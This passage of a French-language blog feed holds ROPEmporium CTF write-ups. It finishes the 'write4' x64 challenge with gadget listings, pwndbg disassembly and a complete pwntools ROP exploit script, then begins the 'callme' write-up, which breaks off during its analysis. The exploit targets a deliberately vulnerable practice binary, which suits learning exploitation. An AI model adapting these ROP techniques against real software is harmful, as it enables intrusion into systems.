</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x000000000040068c</span> : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x000000000040068e</span> : pop r13 ; pop r14 ; pop r15 ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400690</span> : pop r14 ; pop r15 ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400692</span> : pop r15 ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400604</span> : pop rbp ; jmp <span style="color:#ae81ff">0x400590</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x000000000040057b</span> : pop rbp ; mov edi, <span style="color:#ae81ff">0x601038</span> ; jmp rax
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x000000000040068b</span> : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x000000000040068f</span> : pop rbp ; pop r14 ; pop r15 ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400588</span> : pop rbp ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400693</span> : pop rdi ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400691</span> : pop rsi ; pop r15 ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x000000000040068d</span> : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
</span></span></code></pre></div><p>On voit un <code>pop r14 ; pop r15 ; ret</code> à l&rsquo;adresse <code>0x00400690</code>, exactement ce qu&rsquo;il nous faut</p>
<p>Maintenant il faut espérer qu&rsquo;il existe un gadget <code>mov</code> avec ces deux registres, et sans trop de contrainte</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>ROPgadget <span style="color:#f92672">--</span>binary write4 <span style="color:#f92672">|</span> grep <span style="color:#e6db74">&#34;: mov&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x000000000040061c</span> : mov ah, <span style="color:#ae81ff">6</span> ; add al, bpl ; jmp <span style="color:#ae81ff">0x400621</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004005e2</span> : mov byte ptr [rip <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x200a4f</span>], <span style="color:#ae81ff">1</span> ; pop rbp ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400629</span> : mov dword ptr [rsi], edi ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400610</span> : mov eax, <span style="color:#ae81ff">0</span> ; pop rbp ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400602</span> : mov ebp, esp ; pop rbp ; jmp <span style="color:#ae81ff">0x400590</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x000000000040057c</span> : mov edi, <span style="color:#ae81ff">0x601038</span> ; jmp rax
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400628</span> : mov qword ptr [r14], r15 ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400601</span> : mov rbp, rsp ; pop rbp ; jmp <span style="color:#ae81ff">0x400590</span>
</span></span></code></pre></div><p>On voit un <code>mov qword ptr [r14], r15 ; ret</code> à l&rsquo;adresse <code>0x00400628</code>, encore une fois exactement ce qu&rsquo;il nous faut.</p>
<blockquote>
<p>L&rsquo;instruction <code>mov</code> déplace le cotenu du second registre dans le premier, en l&rsquo;occurence ici, il déplace la valeur de r15 dans l&rsquo;adresse dans r14 (grâce au <code>qword ptr</code>)</p></blockquote>
<p>Mais il nous manque encore un gadget! Si on regarde attentivement la description du challenge, on voit qu&rsquo;il existe un fonction <code>print_file()</code> qui prend en argument le nom d&rsquo;un fichier. Le string qu&rsquo;on va écrire dans <code>.data</code> va donc être <code>flag.txt</code> et plus <code>&quot;/bin/cat flag.txt&quot;</code>.</p>
<blockquote>
<p>Rappel: En 64bit, les fonctions prennent leurs arguments dans les registres <code>rdi</code>, <code>rsi</code>, <code>rdx</code>, <code>rcx</code>&hellip; (vous pouvez trouver la liste des registres <a href="https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/linux-x64-calling-convention-stack-frame">ici</a>).
Donc, en modifiant <code>rdi</code> et en plaçant l&rsquo;adresse de <code>.data</code> dedans, la fonction <code>print_file()</code> prendra notre string en premier argument</p></blockquote>
<p>Nous avons donc besoin d&rsquo;un <code>pop rdi</code> !</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>ROPgadget <span style="color:#f92672">--</span>binary write4 <span style="color:#f92672">|</span> grep <span style="color:#e6db74">&#34;pop rdi ; ret&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400693</span> : pop rdi ; ret 
</span></span></code></pre></div><p>Parfait, il nous faut maintenant deux dernières choses: l&rsquo;adresse de la fonction <code>print_file()</code> et le padding nécessaire pour réecrire la sauvegarde de <code>rip</code>.</p>
<blockquote>
<p>Puisque PIE n&rsquo;est pas activé, on peut trouver statiquement l&rsquo;adresse de <code>print_file</code>, si il était activé, nous aurions dû le contourner, par exemple en trouvant la base address de l&rsquo;executable</p></blockquote>
<p>Commençons par trouver l&rsquo;adresse de <code>print_file()</code> avec <code>pwndbg</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> info functions
</span></span><span style="display:flex;"><span>All defined functions:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Non<span style="color:#f92672">-</span>debugging symbols:
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004004d0</span>  _init
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400500</span>  pwnme<span style="color:#a6e22e">@plt</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400510</span>  print_file<span style="color:#a6e22e">@plt</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400520</span>  _start
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400550</span>  _dl_relocate_static_pie
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400560</span>  deregister_tm_clones
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400590</span>  register_tm_clones
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004005d0</span>  __do_global_dtors_aux
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400600</span>  frame_dummy
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400607</span>  main
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400617</span>  usefulFunction
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400628</span>  usefulGadgets
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400630</span>  __libc_csu_init
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004006a0</span>  __libc_csu_fini
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004006a4</span>  _fini
</span></span></code></pre></div><p>Nickel, maintenant le padding:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> disass pwnme
</span></span><span style="display:flex;"><span>Dump of assembler code <span style="color:#66d9ef">for</span> function pwnme:
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c008aa</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">0</span><span style="color:#f92672">&gt;</span>: push   rbp
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c008ab</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">1</span><span style="color:#f92672">&gt;</span>: mov    rbp,rsp
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c008ae</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">4</span><span style="color:#f92672">&gt;</span>: sub    rsp,<span style="color:#ae81ff">0x20</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c008b2</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span>: mov    rax,QWORD PTR [rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0x200727</span>]        <span style="color:#75715e"># 0x7ffff7e00fe0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c008b9</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">15</span><span style="color:#f92672">&gt;</span>:    mov    rax,QWORD PTR [rax]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c008bc</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">18</span><span style="color:#f92672">&gt;</span>:    mov    ecx,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c008c1</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">23</span><span style="color:#f92672">&gt;</span>:    mov    edx,<span style="color:#ae81ff">0x2</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c008c6</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">28</span><span style="color:#f92672">&gt;</span>:    mov    esi,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c008cb</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">33</span><span style="color:#f92672">&gt;</span>:    mov    rdi,rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c008ce</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">36</span><span style="color:#f92672">&gt;</span>:    call   <span style="color:#ae81ff">0x7ffff7c00790</span> <span style="color:#f92672">&lt;</span>setvbuf<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c008d3</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">41</span><span style="color:#f92672">&gt;</span>:    lea    rdi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0x106</span>]        <span style="color:#75715e"># 0x7ffff7c009e0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c008da</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">48</span><span style="color:#f92672">&gt;</span>:    call   <span style="color:#ae81ff">0x7ffff7c00730</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c008df</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">53</span><span style="color:#f92672">&gt;</span>:    lea    rdi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0x111</span>]        <span style="color:#75715e"># 0x7ffff7c009f7</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c008e6</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">60</span><span style="color:#f92672">&gt;</span>:    call   <span style="color:#ae81ff">0x7ffff7c00730</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c008eb</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">65</span><span style="color:#f92672">&gt;</span>:    lea    rax,[rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x20</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c008ef</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">69</span><span style="color:#f92672">&gt;</span>:    mov    edx,<span style="color:#ae81ff">0x20</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c008f4</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">74</span><span style="color:#f92672">&gt;</span>:    mov    esi,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c008f9</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">79</span><span style="color:#f92672">&gt;</span>:    mov    rdi,rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c008fc</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">82</span><span style="color:#f92672">&gt;</span>:    call   <span style="color:#ae81ff">0x7ffff7c00760</span> <span style="color:#f92672">&lt;</span>memset<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00901</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">87</span><span style="color:#f92672">&gt;</span>:    lea    rdi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0xf8</span>]        <span style="color:#75715e"># 0x7ffff7c00a00</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00908</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">94</span><span style="color:#f92672">&gt;</span>:    call   <span style="color:#ae81ff">0x7ffff7c00730</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c0090d</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">99</span><span style="color:#f92672">&gt;</span>:    lea    rdi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0x115</span>]        <span style="color:#75715e"># 0x7ffff7c00a29</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00914</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">106</span><span style="color:#f92672">&gt;</span>:   mov    eax,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">=&gt;</span> <span style="color:#ae81ff">0x00007ffff7c00919</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">111</span><span style="color:#f92672">&gt;</span>:   call   <span style="color:#ae81ff">0x7ffff7c00750</span> <span style="color:#f92672">&lt;</span>printf<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c0091e</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">116</span><span style="color:#f92672">&gt;</span>:   lea    rax,[rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x20</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00922</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">120</span><span style="color:#f92672">&gt;</span>:   mov    edx,<span style="color:#ae81ff">0x200</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00927</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">125</span><span style="color:#f92672">&gt;</span>:   mov    rsi,rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c0092a</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">128</span><span style="color:#f92672">&gt;</span>:   mov    edi,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c0092f</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">133</span><span style="color:#f92672">&gt;</span>:   call   <span style="color:#ae81ff">0x7ffff7c00770</span> <span style="color:#f92672">&lt;</span>read<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00934</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">138</span><span style="color:#f92672">&gt;</span>:   lea    rdi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0xf1</span>]        <span style="color:#75715e"># 0x7ffff7c00a2c</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c0093b</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">145</span><span style="color:#f92672">&gt;</span>:   call   <span style="color:#ae81ff">0x7ffff7c00730</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00940</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">150</span><span style="color:#f92672">&gt;</span>:   nop
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00941</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">151</span><span style="color:#f92672">&gt;</span>:   leave  
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00942</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">152</span><span style="color:#f92672">&gt;</span>:   ret    
</span></span><span style="display:flex;"><span>End of assembler dump<span style="color:#f92672">.</span>
</span></span></code></pre></div><blockquote>
<p>J&rsquo;ai désassemblé la fonction en débuggant l&rsquo;executable puisqu&rsquo;elle était vide tant que le programme n&rsquo;était pas lancé
Pour reproduire ceci, mettez un breakpoint au début de la fonction puis avancez dans l&rsquo;éxecution jusqu&rsquo;au <code>read</code>, puis désassemblez <code>pwnme</code></p></blockquote>
<p>On voit que le buffer est situé à <code>rbp-0x20</code> et que la fonction <code>read</code> va lire <code>0x200</code> bytes d&rsquo;input, ce qui est largement assez. Pour réecrire la sauvegarde de <code>rip</code>, il nous faut <code>0x8</code> bytes de plus que le buffer, donc notre padding total sera de <code>(0x20+0x8)</code> bytes.</p>
<p>Puisque je suis toujours sous Ubuntu, on peut s&rsquo;attendre à des problèmes de stack alignment donc je vais ajouter un <code>ret</code> juste après mon padding</p>
<h2 id="final-payload">Final Payload</h2>
<p>Passons à l&rsquo;exploit:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./write4&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x20</span>
</span></span><span style="display:flex;"><span>rbp <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x8</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ret <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x004004e6</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pop_r14_r15 <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x00400690</span>)
</span></span><span style="display:flex;"><span>data_section <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x00601028</span>)
</span></span><span style="display:flex;"><span>string <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;flag.txt&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>mov_ptr_r14_r15 <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x00400628</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pop_rdi <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x00400693</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print_file <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x00400510</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> padding <span style="color:#f92672">+</span> rbp <span style="color:#f92672">+</span> ret
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># On met l&#39;adresse de la section .data dans r14 et notre &#34;flag.txt&#34; dans r15</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> pop_r14_r15 <span style="color:#f92672">+</span> data_section <span style="color:#f92672">+</span> string 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># On met la valeur de r15 dans l&#39;endroit vers lequel pointe le contenu de r14 (càd .data)</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> mov_ptr_r14_r15
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># On met l&#39;adresse de notre string dans rdi puis on appelle la fonction print_file()</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> pop_rdi <span style="color:#f92672">+</span> data_section <span style="color:#f92672">+</span> print_file
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Flag:&#34;</span>,p<span style="color:#f92672">.</span>recvall()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>))
</span></span></code></pre></div><p>Puis on peut le tester pour s&rsquo;assurer qu&rsquo;il fonctionne:</p>
<p><img src="https://user-images.githubusercontent.com/77807503/213875961-819be98f-e699-4a60-8fe7-45caa64e25ac.png" alt="2023-01-21-160402_1111x283_scrot"></p>
<p>Parfait, on a le flag!</p>
]]></content>
        </item>
        
        <item>
            <title>🇫🇷 ROPEmporium - callme (x64)</title>
            <link>/posts/2023/01/ropemporium-callme-x64/</link>
            <pubDate>Mon, 02 Jan 2023 00:00:00 +0000</pubDate>
            
            <guid>/posts/2023/01/ropemporium-callme-x64/</guid>
            <description>&lt;h2 id=&#34;note&#34;&gt;Note&lt;/h2&gt;
&lt;p&gt;Troisième exo de ROPEmporium, un peu plus court que les deux précédents puisqu&amp;rsquo;il reprend des concepts qu&amp;rsquo;on connaît déjà donc pas trop de difficulté. Par contre un petit problème au niveau de la consigne il me semble.&lt;/p&gt;
&lt;p&gt;Si j&amp;rsquo;ai fait des erreurs, n&amp;rsquo;hésitez pas à me contacter sur &lt;a href=&#34;https://discord.com/users/254689803822563348&#34;&gt;discord&lt;/a&gt; pour me le dire.&lt;/p&gt;
&lt;p&gt;Si vous ne comprenez pas quelque chose, je vous invite à &lt;a href=&#34;/series/ropemporium-x64-series/&#34;&gt;regarder la série dans l&amp;rsquo;ordre&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id=&#34;file-information&#34;&gt;File information&lt;/h2&gt;
&lt;p&gt;Avant de commencer à regarder dans l&amp;rsquo;executable, il faut savoir à quoi on s&amp;rsquo;attaque, on va utiliser &lt;code&gt;file&lt;/code&gt; pour avoir des informations sur le fichier, puis &lt;code&gt;checksec&lt;/code&gt; pour voir les éventuelles sécuritées avec lesquelles il a été compilé&lt;/p&gt;</description>
            <content type="html"><![CDATA[<h2 id="note">Note</h2>
<p>Troisième exo de ROPEmporium, un peu plus court que les deux précédents puisqu&rsquo;il reprend des concepts qu&rsquo;on connaît déjà donc pas trop de difficulté. Par contre un petit problème au niveau de la consigne il me semble.</p>
<p>Si j&rsquo;ai fait des erreurs, n&rsquo;hésitez pas à me contacter sur <a href="https://discord.com/users/254689803822563348">discord</a> pour me le dire.</p>
<p>Si vous ne comprenez pas quelque chose, je vous invite à <a href="/series/ropemporium-x64-series/">regarder la série dans l&rsquo;ordre</a>.</p>
<h2 id="file-information">File information</h2>
<p>Avant de commencer à regarder dans l&rsquo;executable, il faut savoir à quoi on s&rsquo;attaque, on va utiliser <code>file</code> pour avoir des informations sur le fichier, puis <code>checksec</code> pour voir les éventuelles sécuritées avec lesquelles il a été compilé</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-css" data-lang="css"><span style="display:flex;"><span><span style="color:#f92672">file</span> <span style="color:#f92672">callme</span> 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">callme</span><span style="color:#f92672">:</span> <span style="color:#f92672">ELF</span> <span style="color:#f92672">64-bit</span> <span style="color:#f92672">LSB</span> <span style="color:#f92672">executable</span><span style="color:#f92672">,</span> <span style="color:#f92672">x86-64</span><span style="color:#f92672">,</span> <span style="color:#f92672">version</span> <span style="color:#f92672">1</span> <span style="color:#f92672">(</span><span style="color:#f92672">SYSV</span><span style="color:#f92672">),</span> <span style="color:#f92672">dynamically</span> <span style="color:#f92672">linked</span><span style="color:#f92672">,</span> <span style="color:#f92672">interpreter</span> <span style="color:#f92672">/</span><span style="color:#f92672">lib64</span><span style="color:#f92672">/</span><span style="color:#f92672">ld-linux-x86-64</span>.<span style="color:#a6e22e">so</span>.<span style="color:#a6e22e">2</span><span style="color:#f92672">,</span> <span style="color:#f92672">for</span> <span style="color:#f92672">GNU</span><span style="color:#f92672">/</span><span style="color:#f92672">Linux</span> <span style="color:#f92672">3</span>.<span style="color:#a6e22e">2</span>.<span style="color:#a6e22e">0</span><span style="color:#f92672">,</span> <span style="color:#f92672">BuildID</span><span style="color:#f92672">[</span><span style="color:#f92672">sha1</span><span style="color:#f92672">]=</span><span style="color:#f92672">e8e49880bdcaeb9012c6de5f8002c72d8827ea4c</span><span style="color:#f92672">,</span> <span style="color:#f92672">not</span> <span style="color:#f92672">stripped</span>
</span></span></code></pre></div><p>On va donc s&rsquo;attaquer à un executable en 64bit, linké dynamiquement et qui n&rsquo;est pas strippé
Maintenant le <code>checksec</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-css" data-lang="css"><span style="display:flex;"><span><span style="color:#f92672">checksec</span> <span style="color:#f92672">callme</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[*]</span> <span style="color:#e6db74">&#39;/home/conflict/ropemporium/callme_x64/callme&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">Arch</span><span style="color:#f92672">:</span>     <span style="color:#f92672">amd64-64-little</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">RELRO</span><span style="color:#f92672">:</span>    <span style="color:#f92672">Partial</span> <span style="color:#f92672">RELRO</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">Stack</span><span style="color:#f92672">:</span>    <span style="color:#f92672">No</span> <span style="color:#f92672">canary</span> <span style="color:#f92672">found</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">NX</span><span style="color:#f92672">:</span>       <span style="color:#f92672">NX</span> <span style="color:#f92672">enabled</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">PIE</span><span style="color:#f92672">:</span>      <span style="color:#f92672">No</span> <span style="color:#f92672">PIE</span> <span style="color:#f92672">(</span><span style="color:#f92672">0x400000</span><span style="color:#f92672">)</span>
</span></span></code></pre></div><p>Comme pour le précédent, <strong>NX</strong> est activé donc pas de shellcode, mais ce n&rsquo;est pas un problème puisque la description de l&rsquo;exercice nous indique exactement quoi faire</p>
<h2 id="exploitation">Exploitation</h2>
<p>Voici la description:</p>
<pre tabindex="0"><code>You must call the callme_one(), callme_two() and callme_three() functions in that order, each with the arguments 0xdeadbeef, 0xcafebabe, 0xd00df00d 
e.g. callme_one(0xdeadbeef, 0xcafebabe, 0xd00df00d) to print the flag. 

For the x86_64 binary double up those values, e.g. callme_one(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)
</code></pre><p>On peut quand même le lancer et voir ce qu&rsquo;il fait:</p>
<p><img src="https://user-images.githubusercontent.com/77807503/212548895-0fd03e37-d707-47da-ae38-d1789011bca0.png" alt="2023-01-15-150610_1072x508_scrot"></p>
<p>Comme pour le précédent, on voit qu&rsquo;on peut overflow le buffer en envoyant un nombre conséquent de bytes. Désassemblons le <code>main</code> pour voir plus clairement ce qu&rsquo;il se passe:</p>
